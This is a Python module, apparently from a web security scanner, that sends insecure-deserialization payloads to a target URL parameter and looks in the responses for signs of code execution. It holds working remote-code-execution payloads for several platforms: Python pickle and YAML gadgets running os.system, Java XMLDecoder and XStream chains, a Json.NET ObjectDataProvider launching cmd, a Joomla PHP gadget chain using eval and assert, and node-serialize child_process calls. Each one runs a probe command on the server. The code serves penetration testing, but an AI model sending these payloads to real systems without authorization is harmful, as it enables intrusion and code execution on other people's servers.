"""
Fray Insecure Deserialization Module — Java/PHP/Python/.NET payload detection.

Detects and tests:
  - Java: ObjectInputStream, XMLDecoder, SnakeYAML, XStream, Kryo, Hessian
  - PHP: unserialize(), phar://, Magento, Laravel, WordPress
  - Python: pickle, PyYAML, shelve, marshal
  - .NET: BinaryFormatter, SoapFormatter, Json.NET TypeNameHandling
  - Ruby: Marshal.load, YAML.load
  - Node.js: node-serialize, funcster

Usage:
    scanner = DeserScanner(url, param="data")
    result = scanner.scan()

Zero external dependencies — stdlib only.
"""

import base64
import http.client
import json
import re
import ssl
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple


# ── Detection Payloads per Language ──────────────────────────────────────

# Each: (lang, name, payload, indicators_in_response)
_DESER_PAYLOADS: List[Tuple[str, str, str, List[str]]] = [
    # ── Java ──
    ("java", "ysoserial_urldns",
     "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",  # Truncated — triggers DNS lookup
     ["java.", "ClassNotFoundException", "java.io.ObjectInputStream", "StreamCorruptedException"]),

    ("java", "xmldecoder_rce",
     '<?xml version="1.0" encoding="UTF-8"?><java version="1.8"><object class="java.lang.Runtime" method="getRuntime"><void method="exec"><string>id</string></void></object></java>',
     ["uid=", "java.lang.Runtime"]),

    ("java", "snakeyaml_rce",
     "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1\"]]]]",
     ["ScriptEngineManager", "ClassNotFoundException"]),

    ("java", "xstream_rce",
     '<sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>id</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>',
     ["EventHandler", "ProcessBuilder"]),

    # ── PHP ──
    ("php", "unserialize_basic",
     'O:8:"stdClass":1:{s:4:"test";s:5:"fray!";}',
     ["fray!", "unserialize()", "__wakeup", "__destruct"]),

    ("php", "unserialize_exploit",
     'O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:60:"eval(base64_decode(\'cGhwaW5mbygpOw==\'));JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}',
     ["phpinfo", "JDatabaseDriver", "__wakeup"]),

    ("php", "phar_wrapper",
     "phar:///tmp/test.phar",
     ["PharException", "phar error", "__wakeup"]),

    ("php", "laravel_unserialize",
     'a:2:{i:0;O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\\0*\\0event";s:4:"test";}i:1;s:4:"test";}',
     ["PendingBroadcast", "Illuminate\\", "unserialize"]),

    # ── Python ──
    ("python", "pickle_basic",
     base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
     ["uid=", "pickle", "UnpicklingError", "_pickle"]),

    ("python", "pickle_exec",
     base64.b64encode(b"\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x8c\x06system\x93\x8c\x02id\x85R.").decode(),
     ["uid=", "pickle", "UnpicklingError"]),

    ("python", "yaml_unsafe",
     "!!python/object/apply:os.system ['id']",
     ["uid=", "ConstructorError", "yaml.constructor"]),

    ("python", "yaml_exec",
     "!!python/object/new:subprocess.check_output [['id']]",
     ["uid=", "subprocess", "ConstructorError"]),

    # ── .NET ──
    ("dotnet", "binaryformatter",
     "AAEAAAD/////AQAAAAAAAAAPAQAAAE1TeXN0ZW0u",  # Truncated BinaryFormatter header
     ["BinaryFormatter", "SerializationException", "System.Runtime.Serialization"]),

    ("dotnet", "json_net_typehandling",
     '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c id"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
     ["ObjectDataProvider", "TypeNameHandling", "JsonSerializationException"]),

    ("dotnet", "viewstate_unprotected",
     "/wEPDwUKLTEwNDcyNzg1Mg==",  # Simple ViewState probe
     ["ViewState", "MAC validation", "__VIEWSTATE"]),

    ("dotnet", "soap_formatter",
     '<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><a1:X xmlns:a1="http://schemas.microsoft.com/clr/ns/System.Diagnostics"><startInfo><fileName>cmd</fileName></startInfo></a1:X></SOAP-ENV:Body></SOAP-ENV:Envelope>',
     ["SoapFormatter", "SerializationException"]),

    # ── Ruby ──
    ("ruby", "marshal_load",
     "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirementso:\x15Gem::DependencyList\x06",
     ["Marshal", "TypeError", "ArgumentError"]),

    ("ruby", "yaml_load",
     "--- !ruby/object:Gem::Installer\ni: x\n",
     ["Gem::Installer", "Psych::DisallowedClass"]),

    # ── Node.js ──
    ("nodejs", "node_serialize",
     '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
     ["node-serialize", "child_process"]),

    ("nodejs", "funcster",
     '{"__js_function":"function(){return require(\'child_process\').execSync(\'id\').toString()}"}',
     ["funcster", "child_process"]),
]

# ── Header-based detection ──────────────────────────────────────────────

_DESER_HEADERS = [
    ("java", "content-type", "application/x-java-serialized-object"),
    ("java", "content-type", "application/x-java-object"),
    ("dotnet", "content-type", "application/soap+xml"),
    ("php", "content-type", "application/vnd.php.serialized"),
]

# ── Response fingerprints for technology detection ──────────────────────

_TECH_INDICATORS: Dict[str, List[str]] = {
    "java": [r"java\.", r"javax\.", r"apache tomcat", r"jboss", r"wildfly",
             r"glassfish", r"weblogic", r"websphere", r"spring", r"struts",
             r"jsessionid", r"\.jsp", r"servlet"],
    "php": [r"php/\d", r"phpsessid", r"x-powered-by.*php", r"\.php",
            r"laravel", r"symfony", r"wordpress", r"magento", r"drupal"],
    "python": [r"python/\d", r"django", r"flask", r"gunicorn", r"uvicorn",
               r"werkzeug", r"tornado", r"fastapi"],
    "dotnet": [r"asp\.net", r"x-aspnet-version", r"x-powered-by.*asp",
               r"\.aspx", r"__viewstate", r"\.ashx", r"iis/\d"],
    "ruby": [r"ruby", r"rails", r"rack", r"sinatra", r"puma", r"unicorn"],
    "nodejs": [r"express", r"x-powered-by.*express", r"node\.js", r"next\.js"],
}


class DeserFinding:
    __slots__ = ("language", "name", "payload", "param", "evidence",
                 "confidence", "severity")

    def __init__(self, language: str, name: str, payload: str, param: str,
                 evidence: str = "", confidence: str = "confirmed",
                 severity: str = "critical"):
        self.language = language
        self.name = name
        self.payload = payload
        self.param = param
        self.evidence = evidence
        self.confidence = confidence
        self.severity = severity

    def to_dict(self) -> Dict[str, Any]:
        return {
            "language": self.language,
            "name": self.name,
            "payload": self.payload[:100],
            "param": self.param,
            "evidence": self.evidence[:200],
            "confidence": self.confidence,
            "severity": self.severity,
        }


class DeserResult:
    def __init__(self, url: str, param: str):
        self.url = url
        self.param = param
        self.vulnerable = False
        self.detected_tech: List[str] = []
        self.findings: List[DeserFinding] = []
        self.requests_made = 0
        self.duration_ms = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "vulnerable": self.vulnerable,
            "detected_tech": self.detected_tech,
            "findings": [f.to_dict() for f in self.findings],
            "requests_made": self.requests_made,
            "duration_ms": self.duration_ms,
        }


class DeserScanner:
    """Insecure deserialization tester for Java/PHP/Python/.NET/Ruby/Node.js."""

    def __init__(self, url: str, param: str,
                 method: str = "POST",
                 headers: Optional[Dict[str, str]] = None,
                 cookie: str = "",
                 timeout: int = 10,
                 verify_ssl: bool = True,
                 level: int = 1,
                 ):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.custom_headers = headers or {}
        self.cookie = cookie
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.level = level

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_params = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"
        self._requests = 0

    def _request(self, inject_value: str, content_type: str = "") -> Tuple[int, str, Dict[str, str]]:
        params = dict(self._orig_params)
        params[self.param] = inject_value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params, safe="")
            path = f"{self._path}?{qs}"
            body_bytes = None
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")

        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "close",
        }
        if content_type:
            hdrs["Content-Type"] = content_type
        elif body_bytes:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        hdrs.update(self.custom_headers)

        try:
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self._host, self._port,
                                                    timeout=self.timeout, context=ctx)
            else:
                conn = http.client.HTTPConnection(self._host, self._port,
                                                   timeout=self.timeout)
            conn.request(self.method, path, body=body_bytes, headers=hdrs)
            resp = conn.getresponse()
            body = resp.read(1024 * 256).decode("utf-8", errors="replace")
            resp_hdrs = {k.lower(): v for k, v in resp.getheaders()}
            status = resp.status
            conn.close()
        except Exception:
            return 0, "", {}

        self._requests += 1
        return status, body, resp_hdrs

    def _detect_tech(self, body: str, headers: Dict[str, str]) -> List[str]:
        """Detect backend technology from response."""
        techs = []
        combined = body.lower() + " " + " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
        for tech, patterns in _TECH_INDICATORS.items():
            for pat in patterns:
                if re.search(pat, combined, re.IGNORECASE):
                    if tech not in techs:
                        techs.append(tech)
                    break
        return techs

    def scan(self) -> DeserResult:
        result = DeserResult(self.url, self.param)
        t0 = time.monotonic()

        # Phase 1: Baseline + tech detection
        orig_val = self._orig_params.get(self.param, "test")
        _, baseline_body, baseline_hdrs = self._request(orig_val)
        result.detected_tech = self._detect_tech(baseline_body, baseline_hdrs)

        # Phase 2: Test payloads (prioritize detected tech)
        priority_langs = result.detected_tech or ["java", "php", "python", "dotnet"]

        for lang, name, payload, indicators in _DESER_PAYLOADS:
            # Skip non-priority languages at level 1
            if self.level < 2 and lang not in priority_langs:
                continue

            status, body, hdrs = self._request(payload)

            # Check for indicator matches
            for indicator in indicators:
                if re.search(indicator, body, re.IGNORECASE):
                    result.findings.append(DeserFinding(
                        language=lang, name=name, payload=payload,
                        param=self.param,
                        evidence=indicator,
                        confidence="confirmed" if "uid=" in body.lower() else "likely",
                        severity="critical",
                    ))
                    break

            # Check for error-based detection (500 with serialization errors)
            if status == 500 and body != baseline_body:
                deser_errors = [
                    r"deserializ", r"unserialize", r"unmarshal",
                    r"ObjectInputStream", r"BinaryFormatter",
                    r"pickle", r"yaml\.constructor",
                    r"SerializationException", r"StreamCorrupted",
                ]
                for err in deser_errors:
                    if re.search(err, body, re.IGNORECASE):
                        result.findings.append(DeserFinding(
                            language=lang, name=name, payload=payload,
                            param=self.param,
                            evidence=f"500 error with: {err}",
                            confidence="likely",
                            severity="high",
                        ))
                        break

        result.vulnerable = bool(result.findings)
        result.requests_made = self._requests
        result.duration_ms = int((time.monotonic() - t0) * 1000)
        return result
